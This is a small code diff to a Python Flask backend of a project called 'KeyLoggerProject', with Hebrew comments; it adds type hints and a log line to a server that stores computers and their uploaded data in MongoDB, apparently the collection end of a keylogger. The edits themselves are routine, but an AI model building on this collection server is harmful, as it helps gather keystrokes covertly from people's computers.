@@ -13,7 +13,7 @@ CORS(app)
 
 class Users:
 
-    def __init__(self,mongo_link):
+    def __init__(self,mongo_link:str):
         self.CONNECTION_STRING = mongo_link
         self.client = MongoClient(self.CONNECTION_STRING)
         self.DB = self.client["KeyLoggerProject"]
@@ -27,14 +27,13 @@ class Users:
 
 class App:
 
-    def __init__(self,mongo_link):
+    def __init__(self,mongo_link:str):
         self.CONNECTION_STRING = mongo_link
         self.client = MongoClient(self.CONNECTION_STRING)
         self.DB = self.client["KeyLoggerProject"]
         self.collection = self.DB["computers"]
         self.computer_connection = {}
         self.computer_to_stop = []
-        # self.path = "..\\server\\backend\\data"
         self.path = os.path.join("..","server","backend","data")
 
     def get_computers_list(self):
@@ -62,6 +61,8 @@ class App:
         if self.collection.find_one({"mac_name" :data["mac_name"]}) is not None:
             self._update_computer_details(data)
             return
+
+        print("new computer added:" , data["mac_name"])
 
         data["data"] = [data["data"]]
         insert_id = self.collection.insert_one(data).inserted_id
@@ -104,6 +105,7 @@ def home():
 def upload():
 
     try:
+
         data = request.get_json() # קבלת הנתונים שהמחשב שלך
 
         if error_manager(data):  # ניהול שגיאות
